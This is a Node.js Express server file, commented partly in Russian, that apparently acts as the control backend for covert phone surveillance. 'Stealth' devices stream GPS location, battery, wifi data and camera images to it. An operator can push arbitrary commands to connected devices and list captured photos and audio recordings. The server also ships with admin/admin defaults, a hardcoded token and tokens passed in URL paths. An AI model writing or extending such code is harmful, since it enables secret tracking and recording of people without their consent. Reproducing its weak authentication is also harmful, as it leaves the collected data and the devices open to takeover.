import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import { createClient } from "@supabase/supabase-js";
import { WebSocketServer, WebSocket } from "ws";
import http from "http";

const app = express();
const PORT = process.env.PORT || 3000;

console.log("Starting location tracker server...");

// Create HTTP server
const server = http.createServer(app);

// === Supabase ===
const supabaseUrl = process.env.SUPABASE_URL || "https://hapwopjrgwdjwfawpjwq.supabase.co";
const supabaseKey = process.env.SUPABASE_ANON_KEY;

const ADMIN_USER = process.env.ADMIN_USER || "admin";
const ADMIN_PASS = process.env.ADMIN_PASS || "admin";
const SECRET_TOKEN = process.env.SECRET_TOKEN || "your_secret_key_123";

console.log("Configuration:");
console.log("- Supabase URL:", supabaseUrl);
console.log("- Admin User:", ADMIN_USER);
// NOTE: avoid logging SECRET_TOKEN in production

if (!supabaseUrl || !supabaseKey) {
  console.error("Missing Supabase credentials");
  process.exit(1);
}

const supabase = createClient(supabaseUrl, supabaseKey);

// === Middlewares ===
app.use(cors());
app.use(bodyParser.json({ limit: "50mb" }));
app.use(express.static("public"));

// === WebSocket setup (single server, supports legacy path) ===
const stealthConnections = new Map(); // deviceId -> { ws, lastSeen }
const webClients = new Set(); // Set<WebSocket>

const wss = new WebSocketServer({ noServer: true });

// Only accept upgrades for our WS paths; reject everything else
server.on("upgrade", (request, socket, head) => {
  try {
    const url = new URL(request.url, `http://${request.headers.host}`);
    const pathname = url.pathname || "";

    if (pathname.startsWith("/ws/live") || pathname.startsWith("/ws/stealth")) {
      wss.handleUpgrade(request, socket, head, (ws) => {
        wss.emit("connection", ws, request);
      });
    } else {
      // Unknown path -> reject connection
      socket.destroy();
    }
  } catch (err) {
    socket.destroy();
  }
});

// Helper: broadcast object message to all web clients (JSON)
function broadcastToWebClients(obj) {
  const payload = JSON.stringify(obj);
  for (const client of webClients) {
    try {
      if (client.readyState === WebSocket.OPEN) {
        client.send(payload);
      }
    } catch (e) {
      console.error("Error sending to web client:", e);
    }
  }
}

wss.on("connection", (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const pathname = url.pathname;

  let deviceId = url.searchParams.get("deviceId");
  
  if (!deviceId && pathname.startsWith("/ws/stealth/")) {
    const parts = pathname.split("/");
    deviceId = parts[parts.length - 1];
  }

  if (deviceId && deviceId !== "live") {
    // === УСТРОЙСТВО ===
    ws.deviceId = deviceId;
    stealthConnections.set(deviceId, { ws, lastSeen: Date.now() });
    console.log(`Device ${deviceId} connected`);

    ws.on("message", (rawData) => {
      try {
        const dataStr = rawData.toString();
        const msg = JSON.parse(dataStr);
        
        const broadcast = {
          type: msg.type || "message",
          deviceId: deviceId,
          data: msg.data,
          timestamp: msg.timestamp || Date.now()
        };
        
        broadcastToWebClients(broadcast);
        console.log(`Message from ${deviceId}: ${msg.type}`);
        
      } catch (err) {
        console.error(`Error from device ${deviceId}:`, err);
      }
    });

    ws.on("close", () => {
      stealthConnections.delete(deviceId);
      console.log(`Device ${deviceId} disconnected`);
    });

    ws.on("error", (err) => {
      console.error(`Device WebSocket error (${deviceId}):`, err);
    });

  } else {
    // === ВЕБ-КЛИЕНТ ===
    webClients.add(ws);
    console.log(`Web client connected. Total: ${webClients.size}`);

    ws.on("message", (msg) => {
      try {
        // const parsed = JSON.parse(msg.toString());
      } catch (e) {
        // ignore non-json
      }
    });

    ws.on("close", () => {
      webClients.delete(ws);
      console.log(`Web client disconnected. Total: ${webClients.size}`);
    });

    ws.on("error", (err) => {
      console.error("Web client WebSocket error:", err);
    });
  }
}); // <-- закрывает wss.on("connection")

// WS server-level errors
wss.on("error", (err) => {
  console.error("WebSocket server error:", err);
});

// ===== API endpoints (full) =====

// ===== API endpoints (full) =====

// Login
app.post("/api/login", (req, res) => {
  const { username, password } = req.body;
  console.log("Login attempt:", username);
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    return res.json({ success: true, token: SECRET_TOKEN });
  }
  return res.status(401).json({ success: false, error: "Invalid credentials" });
});

// Send command to device
app.post("/api/device/command", (req, res) => {
  const { device_id, command, token } = req.body;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });

  const entry = stealthConnections.get(device_id);
  if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
    try {
      entry.ws.send(JSON.stringify({ action: command, timestamp: Date.now() }));
      console.log(`Command sent to device ${device_id}: ${command}`);
      return res.json({ success: true, command_sent: command });
    } catch (err) {
      console.error("Error sending command to device:", err);
      return res.status(500).json({ error: "Failed to send command" });
    }
  } else {
    console.log(`Device ${device_id} not connected`);
    return res.status(404).json({ error: "Device not connected" });
  }
});

// Fallback image upload via HTTP
app.post("/api/camera/image", (req, res) => {
  const token = req.headers.authorization;
  if (token !== SECRET_TOKEN) return res.status(401).json({ error: "Unauthorized" });

  const { type, device_id, data, timestamp } = req.body;
  console.log(`Received ${type} from device ${device_id} via HTTP fallback`);

  const broadcast = {
    type,
    deviceId: device_id,
    data,
    timestamp: timestamp || Date.now()
  };
  broadcastToWebClients(broadcast);

  return res.json({ success: true });
});

// Delete device locations
app.delete("/api/device/:device_id/:token", async (req, res) => {
  const { device_id, token } = req.params;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });

  try {
    const { error } = await supabase.from("locations").delete().eq("device_id", device_id);
    if (error) throw error;

    console.log(`Device ${device_id} deleted from DB`);
    return res.json({ success: true });
  } catch (err) {
    console.error("Delete device error:", err);
    return res.status(500).json({ error: err.message });
  }
});

// Rename device
app.post("/api/device/:device_id/rename/:token", async (req, res) => {
  const { device_id, token } = req.params;
  const { name } = req.body;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });

  try {
    const { error } = await supabase.from("locations").update({ device_name: name }).eq("device_id", device_id);
    if (error) throw error;

    console.log(`Device ${device_id} renamed to ${name}`);
    return res.json({ success: true });
  } catch (err) {
    console.error("Rename device error:", err);
    return res.status(500).json({ error: err.message });
  }
});

// Files (stub)
app.get("/api/device/:deviceId/files/:token", (req, res) => {
  const { deviceId, token } = req.params;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });

  // TODO: hook into real file storage (Supabase Storage / S3 / etc.)
  return res.json({
    deviceId,
    files: [
      { name: "camera_capture_001.jpg", type: "image", size: "2.4 MB", date: new Date().toISOString() },
      { name: "audio_record_001.mp3", type: "audio", size: "1.1 MB", date: new Date().toISOString() }
    ]
  });
});

// Receive location
app.post("/api/location", async (req, res) => {
  const receivedToken = req.headers.authorization;
  if (receivedToken !== SECRET_TOKEN) {
    console.log("Unauthorized location request:", receivedToken);
    return res.status(401).json({ error: "Unauthorized" });
  }

  const { device_id, device_name, latitude, longitude, timestamp, accuracy, battery, wifi_info } = req.body;

  if (!validateGPSPoint(latitude, longitude, accuracy)) {
    return res.status(400).json({ error: "Invalid GPS coordinates" });
  }

  let timestampValue = typeof timestamp === "string" ? new Date(timestamp).getTime() : timestamp;

  try {
    const { error } = await supabase.from("locations").insert([{
      device_id,
      device_name,
      latitude: parseFloat(latitude),
      longitude: parseFloat(longitude),
      timestamp: timestampValue,
      accuracy: parseFloat(accuracy),
      battery: battery != null ? parseInt(battery) : null,
      wifi_info: wifi_info || null
    }]);

    if (error) {
      console.error("Supabase error:", error);
      return res.status(500).json({ error: "Database error" });
    }

    console.log(`Location saved for device ${device_id}`);

    // Optional: broadcast new location immediately to web clients
    broadcastToWebClients({
      type: "location",
      deviceId: device_id,
      data: { latitude: parseFloat(latitude), longitude: parseFloat(longitude), accuracy: parseFloat(accuracy), battery: battery },
      timestamp: timestampValue || Date.now()
    });

    return res.json({ success: true });
  } catch (err) {
    console.error("Location save error:", err);
    return res.status(500).json({ error: "Server error" });
  }
});

// Get devices list
app.get("/api/devices/:token", async (req, res) => {
  const { token } = req.params;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });

  try {
    const { data, error } = await supabase
      .from("locations")
      .select("device_id, device_name, latitude, longitude, timestamp, battery, accuracy")
      .order("timestamp", { ascending: false });

    if (error) throw error;

    const devices = {};
    data.forEach((location) => {
      if (!devices[location.device_id]) {
        devices[location.device_id] = {
          device_id: location.device_id,
          device_name: location.device_name,
          last_seen: location.timestamp,
          battery: location.battery,
          location_count: 0,
          last_location: { lat: location.latitude, lng: location.longitude },
          is_connected: stealthConnections.has(location.device_id)
        };
      }
      devices[location.device_id].location_count++;
    });

    console.log(`Returned ${Object.keys(devices).length} devices`);
    return res.json(Object.values(devices));
  } catch (err) {
    console.error("Database error:", err);
    return res.status(500).json({ error: "Database error" });
  }
});

// Get specific device data
app.get("/api/device/:deviceId/:token", async (req, res) => {
  const { deviceId, token } = req.params;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });

  try {
    const { data, error } = await supabase
      .from("locations")
      .select("*")
      .eq("device_id", deviceId)
      .order("timestamp", { ascending: true })
      .limit(1000);

    if (error) throw error;

    const filteredLocations = filterDuplicatePoints(
      data.filter((loc) => validateGPSPoint(loc.latitude, loc.longitude, loc.accuracy))
    );

    return res.json({
      device_id: deviceId,
      device_name: data[0]?.device_name || "Unknown Device",
      locations: filteredLocations,
      total_points: data.length,
      is_connected: stealthConnections.has(deviceId)
    });
  } catch (err) {
    console.error("Database error:", err);
    return res.status(500).json({ error: "Database error" });
  }
});

// Analytics
app.get("/api/analytics/:device_id/:token", async (req, res) => {
  const { device_id, token } = req.params;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });

  const days = parseInt(req.query.days) || 7;

  try {
    const { data: locations, error } = await supabase
      .from("locations")
      .select("device_id, device_name, latitude, longitude, timestamp, battery")
      .eq("device_id", device_id)
      .order("timestamp", { ascending: true })
      .limit(500);

    if (error) throw error;

    return res.json({
      device_id,
      device_name: locations[0]?.device_name || "Unknown Device",
      period_days: days,
      total_points: locations.length,
      locations: locations.slice(-100)
    });
  } catch (err) {
    console.error("Analytics error:", err);
    return res.status(500).json({ error: "Analytics error" });
  }
});

// Static index
app.get("/", (req, res) => {
  res.sendFile("index.html", { root: "public" });
});

// === Utility functions ===
function validateGPSPoint(lat, lng, accuracy) {
  if (lat === undefined || lng === undefined) return false;
  const nLat = parseFloat(lat);
  const nLng = parseFloat(lng);
  if (Number.isNaN(nLat) || Number.isNaN(nLng)) return false;
  if (nLat < -90 || nLat > 90 || nLng < -180 || nLng > 180) return false;
  if (accuracy && parseFloat(accuracy) > 100) return false;
  return true;
}

function filterDuplicatePoints(locations, minDistance = 10) {
  if (!locations || locations.length < 2) return locations;
  const filtered = [locations[0]];

  for (let i = 1; i < locations.length; i++) {
    const prev = filtered[filtered.length - 1];
    const curr = locations[i];

    const distance = getDistance(
      parseFloat(prev.latitude), parseFloat(prev.longitude),
      parseFloat(curr.latitude), parseFloat(curr.longitude)
    );

    if (distance > minDistance) filtered.push(curr);
  }

  return filtered;
}

function getDistance(lat1, lon1, lat2, lon2) {
  const R = 6371e3; // metres
  const φ1 = lat1 * Math.PI / 180;
  const φ2 = lat2 * Math.PI / 180;
  const Δφ = (lat2 - lat1) * Math.PI / 180;
  const Δλ = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(Δφ / 2) * Math.sin(Δφ / 2) +
            Math.cos(φ1) * Math.cos(φ2) *
            Math.sin(Δλ / 2) * Math.sin(Δλ / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return R * c;
}

// Start server
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log("WebSocket endpoints:");
  console.log("- Unified: /ws/live (web clients: ws://host/ws/live)");
  console.log("- Devices (query param): ws://host/ws/live?deviceId=SYS123");
  console.log("- Legacy devices path: ws://host/ws/stealth/SYS123");
  console.log("Available endpoints: /api/login, /api/location, /api/camera/image, /api/devices/:token, etc.");
});




